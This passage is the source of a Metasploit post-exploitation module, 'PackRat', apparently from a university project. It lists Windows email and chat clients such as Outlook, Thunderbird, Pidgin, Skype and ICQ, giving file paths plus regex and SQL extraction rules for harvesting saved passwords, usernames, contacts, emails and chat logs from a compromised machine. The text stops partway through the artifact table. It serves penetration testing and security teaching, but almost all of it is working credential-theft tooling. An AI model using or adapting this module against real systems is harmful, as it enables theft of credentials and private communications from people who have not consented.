##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Windows Gather Application Artifacts (PackRat)',
      'Description' => %q{PackRat gathers artifacts of various categories from a large number of applications.
       Artifacts include: 12 browsers, 13 chat/IM/IRC applications, 6 email clients, and 1 game.
       Credentials are then extracted from the artifacts. The use case for this post-exploitation module is
       to specify the types of
       artifacts you are interested in, to gather the relevant files depending on your aims.
       Please refer to the options for a full list of filter categories.},
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'Daniel Hallsworth', # Leeds Beckett University student
          'Barwar Salim M', # Leeds Beckett University student
          'Z. Cliffe Schreuders' # Leeds Beckett University lecturer (http://z.cliffe.schreuders.org)
        ],
      'Platform' => %w{win},
      'SessionTypes' => ['meterpreter']
      ))

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database (otherwise, only download)', 'true']),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('APPCATEGORY', [false, 'Category of applications to gather from', 'All', APPLICATION_ARRAY.map {|x| x[:category]}.uniq.unshift('All')]),
        OptEnum.new('APPLICATION', [false, 'Specify application to gather from', 'All', APPLICATION_ARRAY.map {|x| x[:application]}.uniq.unshift('All')]),
        OptEnum.new('ARTEFACTS', [false, 'Type of artifacts to collect', 'All', APPLICATION_ARRAY.map {|x| x[:filetypes]}.uniq.unshift('All')]),
      ])
  end

  # this associative array defines the artifacts known to PackRat
  APPLICATION_ARRAY =
    [

      ## IncrediMail
      {
        :application => 'incredimail',
        :category => 'emails',
        :file_artifact =>
          [
            {
              :filetypes => 'email_logs',
              :path => 'LocalAppData',
              :dir => 'IM',
              :artifact => 'msg.iml',
              :description => 'IncrediMail sent and received emails',
              :credential_type => 'text',
              :regex_search =>
                [
                  {
                    :extraction_description => 'Searches for credentials (USERNAMES/PASSWORDS)',
                    :extraction_type => 'credentials',
                    :regex => [/password.*/i, /username.*/i],
                  },
                  {
                    :extraction_description => 'searches for Email TO/FROM address',
                    :extraction_type => 'Email addresses',
                    :regex => [/to:.*/i, /from:.*/i],
                  }, #end of email addresses search hash
                ]
            },
          ] #incredimail file artifact end
      }, #incredimail hash end
      ## OutLook
      {
        :application => 'outlook',
        :category => "emails",
        :file_artifact =>
          [
            {
              :filetypes => "deleted_emails",
              :path => 'LocalAppData',
              :dir => 'Identities',
              :artifact => "Deleted Items.dbx",
              :description => "Outlook's Deleted emails",
              :credential_type => "text",
              :regex_search =>
                [
                  {
                    :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                    :extraction_type => "credentials",
                    :regex => [/password.*/i, /username.*/i],
                  },
                  {
                    :extraction_description => "searches for Email TO/FROM address",
                    :extraction_type => "Email addresses",
                    :regex => [/to:.*/i, /from:.*/i],
                  }, #end of email addresses search hash
                ]
            }, #deleted emails hash end
            {
              :filetypes => "draft_emails",
              :path => 'LocalAppData',
              :dir => 'Identities',
              :artifact => "Drafts.dbx",
              :description => "Outlook's unsent emails",
              :credential_type => "text",
              :regex_search =>
                [
                  {
                    :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                    :extraction_type => "credentials",
                    :regex => [/password.*/i, /username.*/i],
                  },
                  {
                    :extraction_description => "searches for Email TO/FROM address",
                    :extraction_type => "Email addresses",
                    :regex => [/to:.*/i, /from:.*/i],
                  }, #end of email addresses search hash
                ]
            }, #outlook drafts hash end
            {
              :filetypes => "email_logs",
              :path => 'LocalAppData',
              :dir => 'Identities',
              :artifact => "Folders.dbx",
              :description => "Outlook's Folders",
              :credential_type => "text",
              :regex_search =>
                [
                  {
                    :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                    :extraction_type => "credentials",
                    :regex => [/password.*/i, /username.*/i],
                  },
                  {
                    :extraction_description => "searches for Email TO/FROM address",
                    :extraction_type => "Email addresses",
                    :regex => [/to:.*/i, /from:.*/i],
                  }, #end of email addresses search hash
                ]
            }, #outlook Folders hash end
            {
              :filetypes => "received_emails",
              :path => 'LocalAppData',
              :dir => 'Identities',
              :artifact => "Inbox.dbx",
              :description => "Outlook's received emails",
              :credential_type => "text",
              :regex_search =>
                [
                  {
                    :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                    :extraction_type => "credentials",
                    :regex => [/password.*/i, /username.*/i],
                  },
                  {
                    :extraction_description => "searches for Email TO/FROM address",
                    :extraction_type => "Email addresses",
                    :regex => [/to:.*/i, /from:.*/i],
                  }, #end of email addresses search hash
                ]
            }, #inbox hash end
            {
              :filetypes => "email_logs",
              :path => 'LocalAppData',
              :dir => 'Identities',
              :artifact => "Offline.dbx",
              :description => "Outlook's offline emails",
              :credential_type => "text",
              :regex_search => [
                {
                  :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                  :extraction_type => "credentials",
                  :regex => [/password.*/i, /username.*/i],
                },
                {
                  :extraction_description => "searches for Email TO/FROM address",
                  :extraction_type => "Email addresses",
                  :regex => [/to:.*/i, /from:.*/i],
                }, #end of email addresses search hash
              ]
            }, #outlook offline hash end
            {
              :filetypes => "email_logs",
              :path => 'LocalAppData',
              :dir => 'Identities',
              :artifact => "Outbox.dbx",
              :description => "Outlook's sent emails",
              :credential_type => "text",
              :regex_search => [
                {
                  :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                  :extraction_type => "credentials",
                  :regex => [/password.*/i, /username.*/i],
                },
                {
                  :extraction_description => "searches for Email TO/FROM address",
                  :extraction_type => "Email addresses",
                  :regex => [/to:.*/i, /from:.*/i],
                }, #end of email addresses search hash
              ]
            }, #outlook sent hash end
            {
              :filetypes => "sent_logs",
              :path => 'LocalAppData',
              :dir => 'Identities',
              :artifact => "Sent Items.dbx",
              :description => "Outlook's sent emails",
              :credential_type => "text",
              :regex_search => [
                {
                  :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                  :extraction_type => "credentials",
                  :regex => [/password.*/i, /username.*/i],
                },
                {
                  :extraction_description => "searches for Email TO/FROM address",
                  :extraction_type => "Email addresses",
                  :regex => [/to:.*/i, /from:.*/i],
                }, #end of email addresses search hash
              ]
            }, #outlook sent email logs hash end

          ] #outlook file artifact end
      }, #outlook hash end

      ## Opera Mail
      {
        :application => 'operamail',
        :category => "emails",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Opera Mail',
            :artifact => "wand.dat",
            :description => "Opera-Mail's saved Username & Passwords",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #operamail wand.dat hash end
          {
            :filetypes => "email_logs",
            :path => 'LocalAppData',
            :dir => 'Opera Mail',
            :artifact => "*.mbs",
            :description => "Opera-Mail's Emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #operamail emails hash end
        ] #opera file artifact end
      }, #operamail hash end
      ## PostBox Mail
      {
        :application => 'postbox',
        :category => "emails",
        :file_artifact => [
          {
            :filetypes => "received_emails",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "INBOX",
            :description => "Postbox's received emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox inbox  hash end
          {
            :filetypes => "sent_emails",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "SENT*",
            :description => "Postbox's sent emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox sent  hash end
          {
            :filetypes => "email_logs",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "*.msf",
            :description => "Postbox's email logs",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox email_logs  hash end
          {
            :filetypes => "email_logs",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "Archive.msf",
            :description => "Postbox's Archive logs",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox archive_logs  hash end
          {
            :filetypes => "email_logs",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "Bulk Mail.msf",
            :description => "Postbox's junk emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox Bulk mail hash end
          {
            :filetypes => "draft_emails",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "Draft.msf",
            :description => "Postbox's unsent emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox draft mail hash end
          {
            :filetypes => "received_emails",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "INBOX.msf",
            :description => "Postbox's received emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox inbox mail hash end
          {
            :filetypes => "sent_emails",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "Sent*.msf",
            :description => "Postbox's sent emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox sent* mail hash end
          {
            :filetypes => "sent_emails",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "Sent.msf",
            :description => "Postbox's sent emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox sent mail hash end
          {
            :filetypes => "email_logs",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "Templates.msf",
            :description => "Postbox's template emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox templates mail hash end
          {
            :filetypes => "deleted_emails",
            :path => 'AppData',
            :dir => 'Postbox',
            :artifact => "Trash.msf",
            :description => "Postbox's Deleted emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #postbox trash mail hash end
        ] #Postbox file artifact end
      }, #Postbox hash end
      ## Mozilla Thunderbird Mail
      {
        :application => 'thunderbird',
        :category => "emails",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "signons.sqlite",
            :description => "Thunderbird's saved Username & Passwords",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Login data",
                  :sql_table => "logins",
                  :sql_column => "username_value, action_url"
                }
              ] #sql search end


          }, #signos sqlite hash end
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "key3.db",
            :description => "Thunderbird's saved Username & Passwords",
            :credential_type => "binary",

          }, #key3.db hash end
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "cert8.db",
            :description => "Thunderbird's saved Username & Passwords",
            :credential_type => "binary",

          }, #cert8.db hash end
          {
            :filetypes => "received_emails",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "Inbox",
            :description => "Thunderbird's received emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ] #end of regex search
          }, #inbox hash end
          {
            :filetypes => "sent_emails",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "Sent",
            :description => "Thunderbird's sent emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ] #end of regex search
          }, #sent hash end
          {
            :filetypes => "deleted_emails",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "Trash",
            :description => "Thunderbird's Deleted emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ] #end of regex search
          }, #deleted hash end
          {
            :filetypes => "draft_emails",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "Drafts",
            :description => "Thunderbird's unsent emails",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ] #end of regex search
          }, #drafts hash end
          {
            :filetypes => "database",
            :path => 'AppData',
            :dir => 'Thunderbird',
            :artifact => "global-messages-db.sqlite",
            :description => "emails info",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Contacts",
                  :sql_table => "contacts",
                  :sql_column => "name"

                },
                {
                  :sql_description => "Conversation Subject",
                  :sql_table => "conversations",
                  :sql_column => "subject"
                },
                {
                  :sql_description => "email address identities",
                  :sql_table => "identities",
                  :sql_column => "value"
                },
                {
                  :sql_description => "Email's",
                  :sql_table => "messagesText_content",
                  :sql_column => "c3author, c4recipients, c1subject, c0body"
                }
              ] #sql search end
          }, #emails info hash end
        ] #thunderbird file artifact end
      }, #thunderbird hash end

      ## Windows Live Mail
      {
        :application => 'windowlivemail',
        :category => "emails",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Microsoft',
            :artifact => "*.oeaccount",
            :description => "Windows Live Mail's saved Username & Password",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #file artifact hash end
        ] #windows live file artifact end
      }, #windows live hash end
      ## AIM (Aol Instant Messaging)
      {
        :application => 'AIM',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'LocalAppData',
            :dir => 'AIM',
            :artifact => "aimx.bin",
            :description => "AIM's saved Username & Passwords",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #AIM aimx.bin artifact hash end
          {
            :filetypes => "chat_logs",
            :path => 'LocalAppData',
            :dir => 'AIM',
            :artifact => "*.html",
            :description => "AIM's chat logs with date and times",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #AIM .html artifact hash end
        ] #AIM  file artifact end
      }, #AIM hash end
      ## Digsby messaging client
      {
        :application => 'digsby',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'LocalAppData',
            :dir => 'Digsby',
            :artifact => "logininfo.yaml",
            :description => "Digsby's saved Username & Passwords",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #logininfo.yaml hash end
        ] #digbsy file artifact end
      }, #digbsy hash end
      ## GaduGadu (Polish chat)
      {
        :application => 'gadugadu',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "chat_logs",
            :path => 'GG dysk',
            :dir => 'Galeria',
            :artifact => "Thumbs.db",
            :description => "Saved Gadu Gadu User Profile Images in Thumbs.db file",
            :credential_type => "image",

          }, #thumbs.db artifact hash end
          {
            :filetypes => "chat_logs",
            :path => 'AppData',
            :dir => 'GG',
            :artifact => "profile.ini",
            :description => "GaduGadu profile User information : Rename long saved artifactto in profile.ini",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/name=.*/i, /login=.*/i, /path=.*/i],
              },
            ]
          }, #profile.ini artifact hash end
        ] #GaduGadu  file artifact end
      }, #GaduGadu hash end
      ## ICQ messaging, video and voice calls
      {
        :application => 'ICQ',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'ICQ',
            :artifact => "Owner.mdb",
            :description => "ICQ's saved Username & Passwords",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #ownder.mdb artifact hash end
          {
            :filetypes => "chat_logs",
            :path => 'AppData',
            :dir => 'ICQ',
            :artifact => "Messages.mdb",
            :description => "ICQ's chat logs",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #Messages.mdb artifact hash end
        ] #ICQ  file artifact end
      }, #ICQ hash end
      ## Miranda is a multi protocol instant messaging client, protocols such as AIM (AOL Instant Messenger), Gadu-Gadu, ICQ, Tlen and others.
      {
        :application => 'miranda',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Miranda',
            :artifact => "Home.dat",
            :description => "Miranda's multi saved chat protocol Username, (coded Passwords)",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #home.dat hash end
        ] #Miranda file artifact end
      }, #miranda hash end
      ## Nimbuzz
      {
        :application => 'nimbuzz',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'nimbuzz',
            :artifact => "nimbuzz.log",
            :description => "Username&Password - user phone number",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/user:.*/i, /user=.*/],
              },
            ]
          }, #Nimbuzz.log hash end
        ] #Nimbuzz file artifact end
      }, #Nimbuzz hash end
      ## Pidgen Pidgin is an easy to use and free chat client used by millions. Connect to AIM, MSN, Yahoo, and others
      {
        :application => 'pidgen',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => '.purple',
            :artifact => "accounts.xml",
            :description => "Pidgen's saved Username & Passwords",
            :credential_type => "xml",
            :xml_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :xml => ['//name', '//password'],
              },
              {
                :extraction_description => "Searches for Identity", :extraction_type => "Identity",
                :xml => ['//alias'],
              }, #end of email addresses search hash
            ]
          }, #pidgin .xml artifact hash end
          {
            :filetypes => "chat_logs",
            :path => 'AppData',
            :dir => '.purple',
            :artifact => "*.html",
            :description => "Pidgen's chat logs",
            :credential_type => "html",
            :xml_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :xml => ['//username', '//password'],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :xml => ['//to', '//from'],
              }, #end of email addresses search hash
            ]
          }, #pidgin .html artifact hash end
        ] #pidgin  file artifact end
      }, #pidgin hash end
      ## QQ International is a Chinese online communication instant messagins with 750+ million existing users.
      {
        :application => 'QQ',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "chat_logs",
            :path => 'AppData',
            :dir => 'Tencent',
            :artifact => "UserHeadTemp*",
            :description => "QQ's Profile Image",
            :credential_type => "image",
          }, #QQ hash end
        ] #QQ file artifact end
      }, #QQ hash end


      ## skype
      {
        :application => 'skype',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Skype',
            :artifact => "main.db",
            :description => "Skype's saved udername and passwords",
            :credential_type => "sqlite",
            :sql_search =>
              [
                {
                  :sql_description => "Database Commands which exports Chrome's Cookie data",
                  :sql_table => "accounts",
                  :sql_column => "fullname, liveid_membername, emails, gender, languages, country, province, city, phone_home, phone_mobile, displayname, signin_name"

                },
                {
                  :sql_description => "Database for Call History",
                  :sql_table => "CallMembers",
                  :sql_column => "identity, dispname"
                },
                {
                  :sql_description => "contacts information",
                  :sql_table => "Contacts",
                  :sql_column => "fullname, emails, gender, languages, country, province, city, phone_home, phone_mobile, displayname, given_displayname, skypename, aliases"
                }
              ] #sql search end
          }
        ] #skype file artifact end
      }, #skype hash end

      ## tango
      {
        :application => 'tango',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "database",
            :path => 'LocalAppData',
            :dir => 'tango',
            :artifact => "contacts.dat",
            :description => "Tango contact names",
            :credential_type => "dat",

          }, #contacts.dat hash end
          {
            :filetypes => "software_version",
            :path => 'LocalAppData',
            :dir => 'tango',
            :artifact => "install.log",
            :description => "Tango Version",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #tango hash end
        ] #tango file artifact end
      }, #tango hash end
      ## Tlen.pl is an adware licensed Polish instant messaging service. It is fully compatible with Gadu-Gadu instant messenger.
      {
        :application => 'tlen.pl',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Tlen.pl',
            :artifact => "Profiles.dat",
            :description => "Tlen.pl saved usernames and passwords",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #tlen hash end
          {
            :filetypes => "chat_logs",
            :path => 'AppData',
            :dir => 'Tlen.pl',
            :artifact => "*.jpg",
            :description => "Tlen.pl sent images",
          }, #jpg hash end
        ] #tlen file artifact end
      }, #tlen hash end
      ## Trillian multi-protocol such as  AIM, ICQ.
      {
        :application => 'trillian',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "logins",
            :path => 'AppData',
            :dir => 'Trillian',
            :artifact => "accounts.ini",
            :description => "Trillian saved usernames and passwords",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for Identification",
                :extraction_type => "Identification",
                :regex => [/.*=.*/i],
              },
            ]
          }, #trillian hash end
          {
            :filetypes => "chat_logs",
            :path => 'AppData',
            :dir => 'Trillian',
            :artifact => "*.log",
            :description => "Trillian logs",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
              }, #end of email addresses search hash
            ]
          }, #trillian hash end
        ] #trillian file artifact end
      }, #trillian hash end
      ## Viber - Texts and videos chat for mobiles and PCs
      {
        :application => 'viber',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "database",
            :path => 'AppData',
            :dir => 'ViberPC',
            :artifact => "viber.db",
            :description => "All Contact's names, numbers, sms are saved from user's mobile",
            :credential_type => "database",

          }, #viber hash end
          {
            :filetypes => "thumbs",
            :path => 'AppData',
            :dir => 'ViberPC',
            :artifact => "Thumbs.db",
            :description => "Viber's Contact's profile images in Thumbs.db file",
            :credential_type => "image",

          }, #viber hash end
          {
            :filetypes => "images",
            :path => 'AppData',
            :dir => 'ViberPC',
            :artifact => "*.jpg",
            :description => "Collects all images of contacts and sent recieved",
            :credential_type => "image",

          }, #viber hash end
        ] #viber file artifact end
      }, #viber hash end
      ## xChat  is used also for
      {
        :application => 'xchat',
        :category => "chats",
        :file_artifact => [
          {
            :filetypes => "chat_logs",
            :path => 'AppData',
            :dir => 'X-Chat 2',
            :artifact => "*.txt",
            :description => "Collects all chatting conversations of sent and recieved",
            :credential_type => "text",
            :regex_search => [
              {
                :extraction_description => "Searches for credentials (USERNAMES/PASSWORDS)",
                :extraction_type => "credentials",
                :regex => [/password.*/i, /username.*/i],
              },
              {
                :extraction_description => "searches for Email TO/FROM address",
                :extraction_type => "Email addresses",
                :regex => [/to:.*/i, /from:.*/i],
